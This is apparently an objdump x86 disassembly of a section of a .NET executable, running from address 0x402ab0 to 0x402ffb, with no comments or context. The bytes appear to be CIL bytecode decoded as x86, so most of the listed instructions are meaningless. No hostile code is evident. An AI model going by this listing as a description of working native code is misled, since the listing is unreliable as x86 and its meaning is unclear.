  402ab0:	00 0a                	add    %cl,(%edx)
  402ab2:	02 17                	add    (%edi),%dl
  402ab4:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402ab7:	00 0a                	add    %cl,(%edx)
  402ab9:	02 02                	add    (%edx),%al
  402abb:	fe 06                	incb   (%esi)
  402abd:	2a 00                	sub    (%eax),%al
  402abf:	00 06                	add    %al,(%esi)
  402ac1:	73 62                	jae    0x402b25
  402ac3:	00 00                	add    %al,(%eax)
  402ac5:	0a 28                	or     (%eax),%ch
  402ac7:	63 00                	arpl   %eax,(%eax)
  402ac9:	00 0a                	add    %cl,(%edx)
  402acb:	02 02                	add    (%edx),%al
  402acd:	fe 06                	incb   (%esi)
  402acf:	2b 00                	sub    (%eax),%eax
  402ad1:	00 06                	add    %al,(%esi)
  402ad3:	73 62                	jae    0x402b37
  402ad5:	00 00                	add    %al,(%eax)
  402ad7:	0a 28                	or     (%eax),%ch
  402ad9:	64 00 00             	add    %al,%fs:(%eax)
  402adc:	0a 2a                	or     (%edx),%ch
  402ade:	00 00                	add    %al,(%eax)
  402ae0:	03 30                	add    (%eax),%esi
  402ae2:	05 00 2d 01 00       	add    $0x12d00,%eax
  402ae7:	00 00                	add    %al,(%eax)
  402ae9:	00 00                	add    %al,(%eax)
  402aeb:	00 02                	add    %al,(%edx)
  402aed:	7b 27                	jnp    0x402b16
  402aef:	00 00                	add    %al,(%eax)
  402af1:	04 39                	add    $0x39,%al
  402af3:	21 01                	and    %eax,(%ecx)
  402af5:	00 00                	add    %al,(%eax)
  402af7:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402afb:	00 04 04             	add    %al,(%esp,%eax,1)
  402afe:	6f                   	outsl  %ds:(%esi),(%dx)
  402aff:	65 00 00             	add    %al,%gs:(%eax)
  402b02:	0a 28                	or     (%eax),%ch
  402b04:	66 00 00             	data16 add %al,(%eax)
  402b07:	0a 02                	or     (%edx),%al
  402b09:	7c 28                	jl     0x402b33
  402b0b:	00 00                	add    %al,(%eax)
  402b0d:	04 04                	add    $0x4,%al
  402b0f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b10:	67 00 00             	add    %al,(%bx,%si)
  402b13:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402b16:	68 00 00 0a 04       	push   $0x40a0000
  402b1b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b1c:	69 00 00 0a 04 6f    	imul   $0x6f040a00,(%eax),%eax
  402b22:	6a 00                	push   $0x0
  402b24:	00 0a                	add    %cl,(%edx)
  402b26:	5f                   	pop    %edi
  402b27:	28 26                	sub    %ah,(%esi)
  402b29:	00 00                	add    %al,(%eax)
  402b2b:	06                   	push   %es
  402b2c:	16                   	push   %ss
  402b2d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b2e:	6b 00 00             	imul   $0x0,(%eax),%eax
  402b31:	0a 28                	or     (%eax),%ch
  402b33:	6c                   	insb   (%dx),%es:(%edi)
  402b34:	00 00                	add    %al,(%eax)
  402b36:	0a 02                	or     (%edx),%al
  402b38:	7c 28                	jl     0x402b62
  402b3a:	00 00                	add    %al,(%eax)
  402b3c:	04 16                	add    $0x16,%al
  402b3e:	28 6d 00             	sub    %ch,0x0(%ebp)
  402b41:	00 0a                	add    %cl,(%edx)
  402b43:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402b47:	00 04 16             	add    %al,(%esi,%edx,1)
  402b4a:	28 6e 00             	sub    %ch,0x0(%esi)
  402b4d:	00 0a                	add    %cl,(%edx)
  402b4f:	04 6f                	add    $0x6f,%al
  402b51:	69 00 00 0a 2c 0c    	imul   $0xc2c0a00,(%eax),%eax
  402b57:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402b5b:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402b5e:	28 6e 00             	sub    %ch,0x0(%esi)
  402b61:	00 0a                	add    %cl,(%edx)
  402b63:	04 6f                	add    $0x6f,%al
  402b65:	6a 00                	push   $0x0
  402b67:	00 0a                	add    %cl,(%edx)
  402b69:	2c 45                	sub    $0x45,%al
  402b6b:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402b6f:	00 04 25 28 6f 00 00 	add    %al,0x6f28(,%eiz,1)
  402b76:	0a 1f                	or     (%edi),%bl
  402b78:	0c 60                	or     $0x60,%al
  402b7a:	28 6e 00             	sub    %ch,0x0(%esi)
  402b7d:	00 0a                	add    %cl,(%edx)
  402b7f:	04 6f                	add    $0x6f,%al
  402b81:	69 00 00 0a 2d 29    	imul   $0x292d0a00,(%eax),%eax
  402b87:	04 6f                	add    $0x6f,%al
  402b89:	65 00 00             	add    %al,%gs:(%eax)
  402b8c:	0a 1f                	or     (%edi),%bl
  402b8e:	40                   	inc    %eax
  402b8f:	31 1f                	xor    %ebx,(%edi)
  402b91:	04 6f                	add    $0x6f,%al
  402b93:	65 00 00             	add    %al,%gs:(%eax)
  402b96:	0a 1f                	or     (%edi),%bl
  402b98:	60                   	pusha
  402b99:	2f                   	das
  402b9a:	15 02 7c 28 00       	adc    $0x287c02,%eax
  402b9f:	00 04 04             	add    %al,(%esp,%eax,1)
  402ba2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ba3:	65 00 00             	add    %al,%gs:(%eax)
  402ba6:	0a 1f                	or     (%edi),%bl
  402ba8:	40                   	inc    %eax
  402ba9:	59                   	pop    %ecx
  402baa:	d1 28                	shrl   $1,(%eax)
  402bac:	6c                   	insb   (%dx),%es:(%edi)
  402bad:	00 00                	add    %al,(%eax)
  402baf:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402bb2:	68 00 00 0a 2c       	push   $0x2c0a0000
  402bb7:	14 02                	adc    $0x2,%al
  402bb9:	7c 28                	jl     0x402be3
  402bbb:	00 00                	add    %al,(%eax)
  402bbd:	04 25                	add    $0x25,%al
  402bbf:	28 6f 00             	sub    %ch,0x0(%edi)
  402bc2:	00 0a                	add    %cl,(%edx)
  402bc4:	1f                   	pop    %ds
  402bc5:	10 60 28             	adc    %ah,0x28(%eax)
  402bc8:	6e                   	outsb  %ds:(%esi),(%dx)
  402bc9:	00 00                	add    %al,(%eax)
  402bcb:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402bce:	70 00                	jo     0x402bd0
  402bd0:	00 0a                	add    %cl,(%edx)
  402bd2:	1f                   	pop    %ds
  402bd3:	14 5f                	adc    $0x5f,%al
  402bd5:	16                   	push   %ss
  402bd6:	31 17                	xor    %edx,(%edi)
  402bd8:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402bdc:	00 04 25 28 6f 00 00 	add    %al,0x6f28(,%eiz,1)
  402be3:	0a 20                	or     (%eax),%ah
  402be5:	80 00 00             	addb   $0x0,(%eax)
  402be8:	00 60 28             	add    %ah,0x28(%eax)
  402beb:	6e                   	outsb  %ds:(%esi),(%dx)
  402bec:	00 00                	add    %al,(%eax)
  402bee:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402bf1:	70 00                	jo     0x402bf3
  402bf3:	00 0a                	add    %cl,(%edx)
  402bf5:	20 90 00 00 00 5f    	and    %dl,0x5f000000(%eax)
  402bfb:	16                   	push   %ss
  402bfc:	31 14 02             	xor    %edx,(%edx,%eax,1)
  402bff:	7c 28                	jl     0x402c29
  402c01:	00 00                	add    %al,(%eax)
  402c03:	04 25                	add    $0x25,%al
  402c05:	28 6f 00             	sub    %ch,0x0(%edi)
  402c08:	00 0a                	add    %cl,(%edx)
  402c0a:	1f                   	pop    %ds
  402c0b:	20 60 28             	and    %ah,0x28(%eax)
  402c0e:	6e                   	outsb  %ds:(%esi),(%dx)
  402c0f:	00 00                	add    %al,(%eax)
  402c11:	0a 02                	or     (%edx),%al
  402c13:	28 17                	sub    %dl,(%edi)
  402c15:	00 00                	add    %al,(%eax)
  402c17:	0a 2a                	or     (%edx),%ch
  402c19:	00 00                	add    %al,(%eax)
  402c1b:	00 03                	add    %al,(%ebx)
  402c1d:	30 05 00 2d 01 00    	xor    %al,0x12d00
  402c23:	00 00                	add    %al,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	00 02                	add    %al,(%edx)
  402c29:	7b 27                	jnp    0x402c52
  402c2b:	00 00                	add    %al,(%eax)
  402c2d:	04 3a                	add    $0x3a,%al
  402c2f:	21 01                	and    %eax,(%ecx)
  402c31:	00 00                	add    %al,(%eax)
  402c33:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402c37:	00 04 04             	add    %al,(%esp,%eax,1)
  402c3a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c3b:	65 00 00             	add    %al,%gs:(%eax)
  402c3e:	0a 28                	or     (%eax),%ch
  402c40:	66 00 00             	data16 add %al,(%eax)
  402c43:	0a 02                	or     (%edx),%al
  402c45:	7c 28                	jl     0x402c6f
  402c47:	00 00                	add    %al,(%eax)
  402c49:	04 04                	add    $0x4,%al
  402c4b:	6f                   	outsl  %ds:(%esi),(%dx)
  402c4c:	67 00 00             	add    %al,(%bx,%si)
  402c4f:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402c52:	68 00 00 0a 04       	push   $0x40a0000
  402c57:	6f                   	outsl  %ds:(%esi),(%dx)
  402c58:	69 00 00 0a 04 6f    	imul   $0x6f040a00,(%eax),%eax
  402c5e:	6a 00                	push   $0x0
  402c60:	00 0a                	add    %cl,(%edx)
  402c62:	5f                   	pop    %edi
  402c63:	28 26                	sub    %ah,(%esi)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	06                   	push   %es
  402c68:	16                   	push   %ss
  402c69:	6f                   	outsl  %ds:(%esi),(%dx)
  402c6a:	6b 00 00             	imul   $0x0,(%eax),%eax
  402c6d:	0a 28                	or     (%eax),%ch
  402c6f:	6c                   	insb   (%dx),%es:(%edi)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	0a 02                	or     (%edx),%al
  402c74:	7c 28                	jl     0x402c9e
  402c76:	00 00                	add    %al,(%eax)
  402c78:	04 17                	add    $0x17,%al
  402c7a:	28 6d 00             	sub    %ch,0x0(%ebp)
  402c7d:	00 0a                	add    %cl,(%edx)
  402c7f:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402c83:	00 04 16             	add    %al,(%esi,%edx,1)
  402c86:	28 6e 00             	sub    %ch,0x0(%esi)
  402c89:	00 0a                	add    %cl,(%edx)
  402c8b:	04 6f                	add    $0x6f,%al
  402c8d:	69 00 00 0a 2c 0c    	imul   $0xc2c0a00,(%eax),%eax
  402c93:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402c97:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402c9a:	28 6e 00             	sub    %ch,0x0(%esi)
  402c9d:	00 0a                	add    %cl,(%edx)
  402c9f:	04 6f                	add    $0x6f,%al
  402ca1:	6a 00                	push   $0x0
  402ca3:	00 0a                	add    %cl,(%edx)
  402ca5:	2c 45                	sub    $0x45,%al
  402ca7:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402cab:	00 04 25 28 6f 00 00 	add    %al,0x6f28(,%eiz,1)
  402cb2:	0a 1f                	or     (%edi),%bl
  402cb4:	0c 60                	or     $0x60,%al
  402cb6:	28 6e 00             	sub    %ch,0x0(%esi)
  402cb9:	00 0a                	add    %cl,(%edx)
  402cbb:	04 6f                	add    $0x6f,%al
  402cbd:	69 00 00 0a 2d 29    	imul   $0x292d0a00,(%eax),%eax
  402cc3:	04 6f                	add    $0x6f,%al
  402cc5:	65 00 00             	add    %al,%gs:(%eax)
  402cc8:	0a 1f                	or     (%edi),%bl
  402cca:	40                   	inc    %eax
  402ccb:	31 1f                	xor    %ebx,(%edi)
  402ccd:	04 6f                	add    $0x6f,%al
  402ccf:	65 00 00             	add    %al,%gs:(%eax)
  402cd2:	0a 1f                	or     (%edi),%bl
  402cd4:	60                   	pusha
  402cd5:	2f                   	das
  402cd6:	15 02 7c 28 00       	adc    $0x287c02,%eax
  402cdb:	00 04 04             	add    %al,(%esp,%eax,1)
  402cde:	6f                   	outsl  %ds:(%esi),(%dx)
  402cdf:	65 00 00             	add    %al,%gs:(%eax)
  402ce2:	0a 1f                	or     (%edi),%bl
  402ce4:	40                   	inc    %eax
  402ce5:	59                   	pop    %ecx
  402ce6:	d1 28                	shrl   $1,(%eax)
  402ce8:	6c                   	insb   (%dx),%es:(%edi)
  402ce9:	00 00                	add    %al,(%eax)
  402ceb:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402cee:	68 00 00 0a 2c       	push   $0x2c0a0000
  402cf3:	14 02                	adc    $0x2,%al
  402cf5:	7c 28                	jl     0x402d1f
  402cf7:	00 00                	add    %al,(%eax)
  402cf9:	04 25                	add    $0x25,%al
  402cfb:	28 6f 00             	sub    %ch,0x0(%edi)
  402cfe:	00 0a                	add    %cl,(%edx)
  402d00:	1f                   	pop    %ds
  402d01:	10 60 28             	adc    %ah,0x28(%eax)
  402d04:	6e                   	outsb  %ds:(%esi),(%dx)
  402d05:	00 00                	add    %al,(%eax)
  402d07:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402d0a:	70 00                	jo     0x402d0c
  402d0c:	00 0a                	add    %cl,(%edx)
  402d0e:	1f                   	pop    %ds
  402d0f:	14 5f                	adc    $0x5f,%al
  402d11:	16                   	push   %ss
  402d12:	31 17                	xor    %edx,(%edi)
  402d14:	02 7c 28 00          	add    0x0(%eax,%ebp,1),%bh
  402d18:	00 04 25 28 6f 00 00 	add    %al,0x6f28(,%eiz,1)
  402d1f:	0a 20                	or     (%eax),%ah
  402d21:	80 00 00             	addb   $0x0,(%eax)
  402d24:	00 60 28             	add    %ah,0x28(%eax)
  402d27:	6e                   	outsb  %ds:(%esi),(%dx)
  402d28:	00 00                	add    %al,(%eax)
  402d2a:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402d2d:	70 00                	jo     0x402d2f
  402d2f:	00 0a                	add    %cl,(%edx)
  402d31:	20 90 00 00 00 5f    	and    %dl,0x5f000000(%eax)
  402d37:	16                   	push   %ss
  402d38:	31 14 02             	xor    %edx,(%edx,%eax,1)
  402d3b:	7c 28                	jl     0x402d65
  402d3d:	00 00                	add    %al,(%eax)
  402d3f:	04 25                	add    $0x25,%al
  402d41:	28 6f 00             	sub    %ch,0x0(%edi)
  402d44:	00 0a                	add    %cl,(%edx)
  402d46:	1f                   	pop    %ds
  402d47:	20 60 28             	and    %ah,0x28(%eax)
  402d4a:	6e                   	outsb  %ds:(%esi),(%dx)
  402d4b:	00 00                	add    %al,(%eax)
  402d4d:	0a 02                	or     (%edx),%al
  402d4f:	28 17                	sub    %dl,(%edi)
  402d51:	00 00                	add    %al,(%eax)
  402d53:	0a 2a                	or     (%edx),%ch
  402d55:	00 00                	add    %al,(%eax)
  402d57:	00 13                	add    %dl,(%ebx)
  402d59:	30 01                	xor    %al,(%ecx)
  402d5b:	00 da                	add    %bl,%dl
  402d5d:	00 00                	add    %al,(%eax)
  402d5f:	00 09                	add    %cl,(%ecx)
  402d61:	00 00                	add    %al,(%eax)
  402d63:	11 03                	adc    %eax,(%ebx)
  402d65:	0a 06                	or     (%esi),%al
  402d67:	45                   	inc    %ebp
  402d68:	10 00                	adc    %al,(%eax)
  402d6a:	00 00                	add    %al,(%eax)
  402d6c:	05 00 00 00 17       	add    $0x17000000,%eax
  402d71:	00 00                	add    %al,(%eax)
  402d73:	00 2d 00 00 00 38    	add    %ch,0x38000000
  402d79:	00 00                	add    %al,(%eax)
  402d7b:	00 4e 00             	add    %cl,0x0(%esi)
  402d7e:	00 00                	add    %al,(%eax)
  402d80:	43                   	inc    %ebx
  402d81:	00 00                	add    %al,(%eax)
  402d83:	00 59 00             	add    %bl,0x0(%ecx)
  402d86:	00 00                	add    %al,(%eax)
  402d88:	64 00 00             	add    %al,%fs:(%eax)
  402d8b:	00 22                	add    %ah,(%edx)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	00 0b                	add    %cl,(%ebx)
  402d91:	00 00                	add    %al,(%eax)
  402d93:	00 6f 00             	add    %ch,0x0(%edi)
  402d96:	00 00                	add    %al,(%eax)
  402d98:	11 00                	adc    %eax,(%eax)
  402d9a:	00 00                	add    %al,(%eax)
  402d9c:	80 00 00             	addb   $0x0,(%eax)
  402d9f:	00 7a 00             	add    %bh,0x0(%edx)
  402da2:	00 00                	add    %al,(%eax)
  402da4:	8c 00                	mov    %es,(%eax)
  402da6:	00 00                	add    %al,(%eax)
  402da8:	86 00                	xchg   %al,(%eax)
  402daa:	00 00                	add    %al,(%eax)
  402dac:	38 87 00 00 00 28    	cmp    %al,0x28000000(%edi)
  402db2:	71 00                	jno    0x402db4
  402db4:	00 0a                	add    %cl,(%edx)
  402db6:	2a 28                	sub    (%eax),%ch
  402db8:	72 00                	jb     0x402dba
  402dba:	00 0a                	add    %cl,(%edx)
  402dbc:	2a 28                	sub    (%eax),%ch
  402dbe:	73 00                	jae    0x402dc0
  402dc0:	00 0a                	add    %cl,(%edx)
  402dc2:	2a 72 77             	sub    0x77(%edx),%dh
  402dc5:	00 00                	add    %al,(%eax)
  402dc7:	70 28                	jo     0x402df1
  402dc9:	74 00                	je     0x402dcb
  402dcb:	00 0a                	add    %cl,(%edx)
  402dcd:	2a 72 87             	sub    -0x79(%edx),%dh
  402dd0:	00 00                	add    %al,(%eax)
  402dd2:	70 28                	jo     0x402dfc
  402dd4:	74 00                	je     0x402dd6
  402dd6:	00 0a                	add    %cl,(%edx)
  402dd8:	2a 72 97             	sub    -0x69(%edx),%dh
  402ddb:	00 00                	add    %al,(%eax)
  402ddd:	70 28                	jo     0x402e07
  402ddf:	74 00                	je     0x402de1
  402de1:	00 0a                	add    %cl,(%edx)
  402de3:	2a 72 a7             	sub    -0x59(%edx),%dh
  402de6:	00 00                	add    %al,(%eax)
  402de8:	70 28                	jo     0x402e12
  402dea:	74 00                	je     0x402dec
  402dec:	00 0a                	add    %cl,(%edx)
  402dee:	2a 72 b7             	sub    -0x49(%edx),%dh
  402df1:	00 00                	add    %al,(%eax)
  402df3:	70 28                	jo     0x402e1d
  402df5:	74 00                	je     0x402df7
  402df7:	00 0a                	add    %cl,(%edx)
  402df9:	2a 72 c7             	sub    -0x39(%edx),%dh
  402dfc:	00 00                	add    %al,(%eax)
  402dfe:	70 28                	jo     0x402e28
  402e00:	74 00                	je     0x402e02
  402e02:	00 0a                	add    %cl,(%edx)
  402e04:	2a 72 d7             	sub    -0x29(%edx),%dh
  402e07:	00 00                	add    %al,(%eax)
  402e09:	70 28                	jo     0x402e33
  402e0b:	74 00                	je     0x402e0d
  402e0d:	00 0a                	add    %cl,(%edx)
  402e0f:	2a 72 e7             	sub    -0x19(%edx),%dh
  402e12:	00 00                	add    %al,(%eax)
  402e14:	70 28                	jo     0x402e3e
  402e16:	74 00                	je     0x402e18
  402e18:	00 0a                	add    %cl,(%edx)
  402e1a:	2a 72 f7             	sub    -0x9(%edx),%dh
  402e1d:	00 00                	add    %al,(%eax)
  402e1f:	70 28                	jo     0x402e49
  402e21:	74 00                	je     0x402e23
  402e23:	00 0a                	add    %cl,(%edx)
  402e25:	2a 28                	sub    (%eax),%ch
  402e27:	75 00                	jne    0x402e29
  402e29:	00 0a                	add    %cl,(%edx)
  402e2b:	2a 28                	sub    (%eax),%ch
  402e2d:	76 00                	jbe    0x402e2f
  402e2f:	00 0a                	add    %cl,(%edx)
  402e31:	2a 28                	sub    (%eax),%ch
  402e33:	77 00                	ja     0x402e35
  402e35:	00 0a                	add    %cl,(%edx)
  402e37:	2a 28                	sub    (%eax),%ch
  402e39:	78 00                	js     0x402e3b
  402e3b:	00 0a                	add    %cl,(%edx)
  402e3d:	2a 00                	sub    (%eax),%al
  402e3f:	00 03                	add    %al,(%ebx)
  402e41:	30 03                	xor    %al,(%ebx)
  402e43:	00 c6                	add    %al,%dh
  402e45:	00 00                	add    %al,(%eax)
  402e47:	00 00                	add    %al,(%eax)
  402e49:	00 00                	add    %al,(%eax)
  402e4b:	00 02                	add    %al,(%edx)
  402e4d:	28 79 00             	sub    %bh,0x0(%ecx)
  402e50:	00 0a                	add    %cl,(%edx)
  402e52:	02 22                	add    (%edx),%ah
  402e54:	00 00                	add    %al,(%eax)
  402e56:	c0 40 22 00          	rolb   $0x0,0x22(%eax)
  402e5a:	00 50 41             	add    %dl,0x41(%eax)
  402e5d:	73 2a                	jae    0x402e89
  402e5f:	00 00                	add    %al,(%eax)
  402e61:	0a 28                	or     (%eax),%ch
  402e63:	2b 00                	sub    (%eax),%eax
  402e65:	00 0a                	add    %cl,(%edx)
  402e67:	02 17                	add    (%edi),%dl
  402e69:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402e6c:	00 0a                	add    %cl,(%edx)
  402e6e:	02 17                	add    (%edi),%dl
  402e70:	6f                   	outsl  %ds:(%esi),(%dx)
  402e71:	7a 00                	jp     0x402e73
  402e73:	00 0a                	add    %cl,(%edx)
  402e75:	02 28                	add    (%eax),%ch
  402e77:	27                   	daa
  402e78:	00 00                	add    %al,(%eax)
  402e7a:	0a 6f 28             	or     0x28(%edi),%ch
  402e7d:	00 00                	add    %al,(%eax)
  402e7f:	0a 6f 30             	or     0x30(%edi),%ch
  402e82:	00 00                	add    %al,(%eax)
  402e84:	0a 02                	or     (%edx),%al
  402e86:	20 93 00 00 00 28    	and    %dl,0x28000000(%ebx)
  402e8c:	59                   	pop    %ecx
  402e8d:	00 00                	add    %al,(%eax)
  402e8f:	0a 02                	or     (%edx),%al
  402e91:	20 20                	and    %ah,(%eax)
  402e93:	03 00                	add    (%eax),%eax
  402e95:	00 28                	add    %ch,(%eax)
  402e97:	5a                   	pop    %edx
  402e98:	00 00                	add    %al,(%eax)
  402e9a:	0a 02                	or     (%edx),%al
  402e9c:	28 77 00             	sub    %dh,0x0(%edi)
  402e9f:	00 0a                	add    %cl,(%edx)
  402ea1:	6f                   	outsl  %ds:(%esi),(%dx)
  402ea2:	7b 00                	jnp    0x402ea4
  402ea4:	00 0a                	add    %cl,(%edx)
  402ea6:	02 17                	add    (%edi),%dl
  402ea8:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402eac:	0a 02                	or     (%edx),%al
  402eae:	16                   	push   %ss
  402eaf:	28 4a 00             	sub    %cl,0x0(%edx)
  402eb2:	00 0a                	add    %cl,(%edx)
  402eb4:	02 16                	add    (%esi),%dl
  402eb6:	28 4b 00             	sub    %cl,0x0(%ebx)
  402eb9:	00 0a                	add    %cl,(%edx)
  402ebb:	02 16                	add    (%esi),%dl
  402ebd:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  402ec1:	0a 02                	or     (%edx),%al
  402ec3:	17                   	pop    %ss
  402ec4:	28 45 00             	sub    %al,0x0(%ebp)
  402ec7:	00 0a                	add    %cl,(%edx)
  402ec9:	02 28                	add    (%eax),%ch
  402ecb:	7d 00                	jge    0x402ecd
  402ecd:	00 0a                	add    %cl,(%edx)
  402ecf:	02 7b 2a             	add    0x2a(%ebx),%bh
  402ed2:	00 00                	add    %al,(%eax)
  402ed4:	04 02                	add    $0x2,%al
  402ed6:	fe 06                	incb   (%esi)
  402ed8:	2e 00 00             	add    %al,%cs:(%eax)
  402edb:	06                   	push   %es
  402edc:	73 7e                	jae    0x402f5c
  402ede:	00 00                	add    %al,(%eax)
  402ee0:	0a 6f 7f             	or     0x7f(%edi),%ch
  402ee3:	00 00                	add    %al,(%eax)
  402ee5:	0a 02                	or     (%edx),%al
  402ee7:	7b 2a                	jnp    0x402f13
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	04 23                	add    $0x23,%al
  402eed:	00 00                	add    %al,(%eax)
  402eef:	00 00                	add    %al,(%eax)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	49                   	dec    %ecx
  402ef4:	40                   	inc    %eax
  402ef5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ef6:	80 00 00             	addb   $0x0,(%eax)
  402ef9:	0a 02                	or     (%edx),%al
  402efb:	7b 2a                	jnp    0x402f27
  402efd:	00 00                	add    %al,(%eax)
  402eff:	04 17                	add    $0x17,%al
  402f01:	6f                   	outsl  %ds:(%esi),(%dx)
  402f02:	81 00 00 0a 02 7b    	addl   $0x7b020a00,(%eax)
  402f08:	2a 00                	sub    (%eax),%al
  402f0a:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402f0d:	82 00 00             	addb   $0x0,(%eax)
  402f10:	0a 2a                	or     (%edx),%ch
  402f12:	00 00                	add    %al,(%eax)
  402f14:	03 30                	add    (%eax),%esi
  402f16:	02 00                	add    (%eax),%al
  402f18:	6d                   	insl   (%dx),%es:(%edi)
  402f19:	00 00                	add    %al,(%eax)
  402f1b:	00 00                	add    %al,(%eax)
  402f1d:	00 00                	add    %al,(%eax)
  402f1f:	00 02                	add    %al,(%edx)
  402f21:	7b 2d                	jnp    0x402f50
  402f23:	00 00                	add    %al,(%eax)
  402f25:	04 2c                	add    $0x2c,%al
  402f27:	01 2a                	add    %ebp,(%edx)
  402f29:	02 17                	add    (%edi),%dl
  402f2b:	7d 2d                	jge    0x402f5a
  402f2d:	00 00                	add    %al,(%eax)
  402f2f:	04 02                	add    $0x2,%al
  402f31:	7b 2b                	jnp    0x402f5e
  402f33:	00 00                	add    %al,(%eax)
  402f35:	04 16                	add    $0x16,%al
  402f37:	32 4c 02 7b          	xor    0x7b(%edx,%eax,1),%cl
  402f3b:	2c 00                	sub    $0x0,%al
  402f3d:	00 04 16             	add    %al,(%esi,%edx,1)
  402f40:	32 28                	xor    (%eax),%ch
  402f42:	02 7b 2e             	add    0x2e(%ebx),%bh
  402f45:	00 00                	add    %al,(%eax)
  402f47:	04 02                	add    $0x2,%al
  402f49:	7b 2b                	jnp    0x402f76
  402f4b:	00 00                	add    %al,(%eax)
  402f4d:	04 6f                	add    $0x6f,%al
  402f4f:	83 00 00             	addl   $0x0,(%eax)
  402f52:	0a 7b 31             	or     0x31(%ebx),%bh
  402f55:	00 00                	add    %al,(%eax)
  402f57:	04 02                	add    $0x2,%al
  402f59:	7b 2c                	jnp    0x402f87
  402f5b:	00 00                	add    %al,(%eax)
  402f5d:	04 6f                	add    $0x6f,%al
  402f5f:	84 00                	test   %al,(%eax)
  402f61:	00 0a                	add    %cl,(%edx)
  402f63:	02 15 7d 2c 00 00    	add    0x2c7d,%dl
  402f69:	04 02                	add    $0x2,%al
  402f6b:	7b 2e                	jnp    0x402f9b
  402f6d:	00 00                	add    %al,(%eax)
  402f6f:	04 02                	add    $0x2,%al
  402f71:	7b 2b                	jnp    0x402f9e
  402f73:	00 00                	add    %al,(%eax)
  402f75:	04 6f                	add    $0x6f,%al
  402f77:	83 00 00             	addl   $0x0,(%eax)
  402f7a:	0a 7b 31             	or     0x31(%ebx),%bh
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	04 6f                	add    $0x6f,%al
  402f81:	85 00                	test   %eax,(%eax)
  402f83:	00 0a                	add    %cl,(%edx)
  402f85:	02 16                	add    (%esi),%dl
  402f87:	7d 2d                	jge    0x402fb6
  402f89:	00 00                	add    %al,(%eax)
  402f8b:	04 2a                	add    $0x2a,%al
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	00 03                	add    %al,(%ebx)
  402f91:	30 04 00             	xor    %al,(%eax,%eax,1)
  402f94:	83 02 00             	addl   $0x0,(%edx)
  402f97:	00 00                	add    %al,(%eax)
  402f99:	00 00                	add    %al,(%eax)
  402f9b:	00 03                	add    %al,(%ebx)
  402f9d:	73 2d                	jae    0x402fcc
  402f9f:	00 00                	add    %al,(%eax)
  402fa1:	0a 7d 2f             	or     0x2f(%ebp),%bh
  402fa4:	00 00                	add    %al,(%eax)
  402fa6:	04 03                	add    $0x3,%al
  402fa8:	7b 2f                	jnp    0x402fd9
  402faa:	00 00                	add    %al,(%eax)
  402fac:	04 1b                	add    $0x1b,%al
  402fae:	6f                   	outsl  %ds:(%esi),(%dx)
  402faf:	86 00                	xchg   %al,(%eax)
  402fb1:	00 0a                	add    %cl,(%edx)
  402fb3:	03 7b 2f             	add    0x2f(%ebx),%edi
  402fb6:	00 00                	add    %al,(%eax)
  402fb8:	04 1f                	add    $0x1f,%al
  402fba:	68 04 5a 1f 0a       	push   $0xa1f5a04
  402fbf:	58                   	pop    %eax
  402fc0:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc1:	87 00                	xchg   %eax,(%eax)
  402fc3:	00 0a                	add    %cl,(%edx)
  402fc5:	03 7b 2f             	add    0x2f(%ebx),%edi
  402fc8:	00 00                	add    %al,(%eax)
  402fca:	04 20                	add    $0x20,%al
  402fcc:	0c 03                	or     $0x3,%al
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	6f                   	outsl  %ds:(%esi),(%dx)
  402fd1:	5a                   	pop    %edx
  402fd2:	00 00                	add    %al,(%eax)
  402fd4:	0a 03                	or     (%ebx),%al
  402fd6:	7b 2f                	jnp    0x403007
  402fd8:	00 00                	add    %al,(%eax)
  402fda:	04 1f                	add    $0x1f,%al
  402fdc:	10 6f 59             	adc    %ch,0x59(%edi)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	0a 03                	or     (%ebx),%al
  402fe3:	7b 2f                	jnp    0x403014
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	04 03                	add    $0x3,%al
  402fe9:	7b 2f                	jnp    0x40301a
  402feb:	00 00                	add    %al,(%eax)
  402fed:	04 6f                	add    $0x6f,%al
  402fef:	88 00                	mov    %al,(%eax)
  402ff1:	00 0a                	add    %cl,(%edx)
  402ff3:	17                   	pop    %ss
  402ff4:	73 89                	jae    0x402f7f
  402ff6:	00 00                	add    %al,(%eax)
  402ff8:	0a 6f 8a             	or     -0x76(%edi),%ch
  402ffb:	00 00                	add    %al,(%eax)
